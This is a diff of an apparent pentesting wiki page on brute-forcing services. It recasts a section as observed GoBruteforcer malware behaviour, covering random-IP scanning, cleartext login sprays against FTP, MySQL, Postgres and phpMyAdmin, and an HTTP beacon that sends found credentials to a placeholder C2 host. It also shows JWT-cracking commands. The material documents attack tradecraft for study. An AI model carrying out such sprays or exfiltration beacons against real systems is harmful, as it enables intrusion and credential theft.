@@ -97,11 +97,13 @@ Finished in 0.920s.
 
 ## Internet-wide bruteforcer workflow (lessons from Go-based scanners)
 
-- Maintain **architecture-tuned worker pools** (for example, ~95 goroutines on `x86_64/arm64`, ~85 on `i686`, ~50 on low-end ARM) and respawn every second to keep **fixed concurrency**, with each worker handling exactly one target IP before exiting.<sup>[[1]](#references)</sup>
-- Generate **random public IPv4s** but drop obvious honeypot-heavy or unroutable ranges: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) and DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Probe the service port** with a short timeout (~2s) before attempting **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin over HTTP/80) and fall back to a **small builtin credential list** if the remote dictionary/C2 fetch fails.
+The following behaviors were observed in the GoBruteforcer malware's scanning workflow; exact values are sample-specific.<sup>[[1]](#references)</sup>
+
+- Maintain **architecture-tuned worker pools** (for example, 95 concurrent workers on `x86_64/arm64`, 85 on `i686`, 35 on `armv5tel`, and 50 by default on other architectures), check active workers every second, and spawn replacements when below target; each worker handles at most one target IP before exiting.
+- Generate **random public IPv4s** but drop obvious unroutable and selected operator-avoided ranges: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) and DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Probe the service port** with a short timeout (~2s) before attempting **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin over HTTP/80) and fall back to a **small builtin credential list** if the C2 credential fetch fails.
 - **Exfiltrate hits** via tiny HTTP GET beacons such as `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (service codes like `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) while reusing a common browser User-Agent to blend in.
-- **phpMyAdmin spray** can brute-force dozens of likely paths (~80+) with `GET /index.php?lang=en`, detect PMA markers (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) and parse `codemirror.css?v=X.Y.Z` to branch auth: versions `<4.9` accept GET params `pma_username`/`pma_password`; versions `>=4.9` require POST with `server=1`, CSRF `token`, and the same creds.
+- **phpMyAdmin spray** can brute-force about 80 likely paths with `GET /index.php?lang=en`, detect PMA markers (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) and parse `codemirror.css?v=X.Y.Z` to branch auth: versions `<4.9` accept GET params `pma_username`/`pma_password`; versions `>=4.9` use POST with `server=1`, CSRF `token`, and the same creds.
 
 ## Services
 
@@ -237,9 +239,6 @@ nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/va
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
-
-#https://github.com/Sjord/jwtcrack
-python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
 
 #John
 john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
